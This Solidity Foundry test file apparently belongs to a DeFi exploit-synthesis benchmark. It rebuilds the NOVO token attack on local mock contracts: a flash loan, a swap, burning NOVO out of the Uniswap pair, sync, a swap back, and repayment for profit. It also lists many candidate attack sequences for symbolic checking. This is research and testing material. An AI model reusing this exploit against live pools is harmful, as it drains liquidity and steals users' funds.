// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./AttackContract.sol";
import "./NOVO.sol";
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
import {WBNB} from "@utils/WBNB.sol";

contract NOVOTest is Test, BlockLoader {
    WBNB wbnb;
    NOVO novo;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address wbnbAddr;
    address novoAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address attackContractAddr;
    uint256 blockTimestamp = 1653831935;
    uint112 reserve0pair = 120090152116998645;
    uint112 reserve1pair = 395001031454274158328;
    uint32 blockTimestampLastpair = 1653795431;
    uint256 kLastpair = 47431376555807750484268380356758619314;
    uint256 price0CumulativeLastpair =
        250550398307406791330448545601492452154495242;
    uint256 price1CumulativeLastpair = 23905021586781263190943888370070935628;
    uint256 totalSupplynovo = 1000000000000000000;
    uint256 balanceOfnovopair = 120090152116998645;
    uint256 balanceOfnovoattacker = 0;
    uint256 balanceOfnovonovo = 353303644762273;
    uint256 totalSupplywbnb = 5209947283371589566696235;
    uint256 balanceOfwbnbpair = 395001031454274158328;
    uint256 balanceOfwbnbattacker = 0;
    uint256 balanceOfwbnbnovo = 0;

    function setUp() public {
        owner = address(this);
        wbnb = new WBNB();
        wbnbAddr = address(wbnb);
        novo = new NOVO();
        novoAddr = address(novo);
        pair = new UniswapV2Pair(
            address(novo),
            address(wbnb),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackContractAddr = address(attackContract);
        attacker = address(attackContract);
        novo.afterDeploy(address(pair));
        // Initialize balances and mock flashloan.
        novo.transfer(address(novo), balanceOfnovonovo);
        wbnb.transfer(address(pair), balanceOfwbnbpair);
        novo.transfer(address(pair), balanceOfnovopair);
        wbnb.approve(attacker, UINT256_MAX);
        novo.approve(attacker, UINT256_MAX);
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Wbnb Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(wbnb),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(novo),
            address(wbnb),
            novo.decimals()
        );
        emit log_string("");
        emit log_string("Novo Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(novo),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(novo),
            address(novo),
            novo.decimals()
        );
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(pair),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(novo),
            address(pair),
            novo.decimals()
        );
        emit log_string("");
        emit log_string("Attackcontract Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(attackContract),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(novo),
            address(attackContract),
            novo.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return wbnb.balanceOf(attacker) >= 1e18 + balanceOfwbnbattacker;
    }

    function nop(uint256 amount) internal pure {
        return;
    }

    function borrow_wbnb(uint256 amount) internal {
        wbnb.transferFrom(owner, attacker, amount);
    }

    function payback_wbnb(uint256 amount) internal {
        wbnb.transfer(owner, amount);
    }

    function borrow_novo(uint256 amount) internal {
        novo.transferFrom(owner, attacker, amount);
    }

    function payback_novo(uint256 amount) internal {
        novo.transfer(owner, amount);
    }

    function swap_pair_novo_wbnb(uint256 amount) internal {
        novo.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(novo);
        path[1] = address(wbnb);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function swap_pair_wbnb_novo(uint256 amount) internal {
        wbnb.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(wbnb);
        path[1] = address(novo);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function sync_pair() internal {
        pair.sync();
    }

    function burn_pair_novo(uint256 amount) internal {
        novo.transferFrom(address(pair), address(novo), amount);
    }

    function test_gt() public {
        vm.startPrank(attacker);
        borrow_wbnb(17e18);
        printBalance("After step0 ");
        swap_pair_wbnb_novo(wbnb.balanceOf(attacker));
        printBalance("After step1 ");
        burn_pair_novo(0.113951614e18);
        printBalance("After step2 ");
        sync_pair();
        printBalance("After step3 ");
        swap_pair_novo_wbnb(novo.balanceOf(attacker));
        printBalance("After step4 ");
        payback_wbnb((17e18 * 1003) / 1000);
        printBalance("After step5 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_wbnb(amt0);
        swap_pair_wbnb_novo(amt1);
        burn_pair_novo(amt2);
        sync_pair();
        swap_pair_novo_wbnb(amt3);
        payback_wbnb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_wbnb(amt0);
        swap_pair_wbnb_novo(amt1);
        burn_pair_novo(amt2);
        swap_pair_novo_wbnb(amt3);
        payback_wbnb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_wbnb(amt0);
        swap_pair_wbnb_novo(amt1);
        burn_pair_novo(amt2);
        swap_pair_novo_wbnb(amt3);
        swap_pair_novo_wbnb(amt4);
        payback_wbnb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_wbnb(amt0);
        swap_pair_wbnb_novo(amt1);
        burn_pair_novo(amt2);
        sync_pair();
        swap_pair_novo_wbnb(amt3);
        payback_wbnb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_wbnb(amt0);
        swap_pair_wbnb_novo(amt1);
        burn_pair_novo(amt2);
        burn_pair_novo(amt3);
        swap_pair_novo_wbnb(amt4);
        payback_wbnb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_wbnb(amt0);
        swap_pair_wbnb_novo(amt1);
        burn_pair_novo(amt2);
        sync_pair();
        swap_pair_novo_wbnb(amt3);
        swap_pair_novo_wbnb(amt4);
        payback_wbnb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        borrow_wbnb(amt0);
        swap_pair_wbnb_novo(amt1);
        burn_pair_novo(amt2);
        burn_pair_novo(amt3);
        swap_pair_novo_wbnb(amt4);
        swap_pair_novo_wbnb(amt5);
        payback_wbnb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_wbnb(amt0);
        swap_pair_wbnb_novo(amt1);
        burn_pair_novo(amt2);
        burn_pair_novo(amt3);
        sync_pair();
        swap_pair_novo_wbnb(amt4);
        payback_wbnb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        borrow_wbnb(amt0);
        swap_pair_wbnb_novo(amt1);
        burn_pair_novo(amt2);
        burn_pair_novo(amt3);
        burn_pair_novo(amt4);
        swap_pair_novo_wbnb(amt5);
        payback_wbnb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        borrow_wbnb(amt0);
        swap_pair_wbnb_novo(amt1);
        burn_pair_novo(amt2);
        burn_pair_novo(amt3);
        sync_pair();
        swap_pair_novo_wbnb(amt4);
        swap_pair_novo_wbnb(amt5);
        payback_wbnb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 == (amt0 * 1003) / 1000);
        borrow_wbnb(amt0);
        swap_pair_wbnb_novo(amt1);
        burn_pair_novo(amt2);
        burn_pair_novo(amt3);
        burn_pair_novo(amt4);
        swap_pair_novo_wbnb(amt5);
        swap_pair_novo_wbnb(amt6);
        payback_wbnb(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        borrow_wbnb(amt0);
        swap_pair_wbnb_novo(amt1);
        burn_pair_novo(amt2);
        burn_pair_novo(amt3);
        burn_pair_novo(amt4);
        sync_pair();
        swap_pair_novo_wbnb(amt5);
        payback_wbnb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 == (amt0 * 1003) / 1000);
        borrow_wbnb(amt0);
        swap_pair_wbnb_novo(amt1);
        burn_pair_novo(amt2);
        burn_pair_novo(amt3);
        burn_pair_novo(amt4);
        burn_pair_novo(amt5);
        swap_pair_novo_wbnb(amt6);
        payback_wbnb(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 == (amt0 * 1003) / 1000);
        borrow_wbnb(amt0);
        swap_pair_wbnb_novo(amt1);
        burn_pair_novo(amt2);
        burn_pair_novo(amt3);
        burn_pair_novo(amt4);
        sync_pair();
        swap_pair_novo_wbnb(amt5);
        swap_pair_novo_wbnb(amt6);
        payback_wbnb(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt8 == (amt0 * 1003) / 1000);
        borrow_wbnb(amt0);
        swap_pair_wbnb_novo(amt1);
        burn_pair_novo(amt2);
        burn_pair_novo(amt3);
        burn_pair_novo(amt4);
        burn_pair_novo(amt5);
        swap_pair_novo_wbnb(amt6);
        swap_pair_novo_wbnb(amt7);
        payback_wbnb(amt8);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand014(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 == (amt0 * 1003) / 1000);
        borrow_wbnb(amt0);
        swap_pair_wbnb_novo(amt1);
        burn_pair_novo(amt2);
        burn_pair_novo(amt3);
        burn_pair_novo(amt4);
        burn_pair_novo(amt5);
        sync_pair();
        swap_pair_novo_wbnb(amt6);
        payback_wbnb(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand015(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt8 == (amt0 * 1003) / 1000);
        borrow_wbnb(amt0);
        swap_pair_wbnb_novo(amt1);
        burn_pair_novo(amt2);
        burn_pair_novo(amt3);
        burn_pair_novo(amt4);
        burn_pair_novo(amt5);
        sync_pair();
        swap_pair_novo_wbnb(amt6);
        swap_pair_novo_wbnb(amt7);
        payback_wbnb(amt8);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
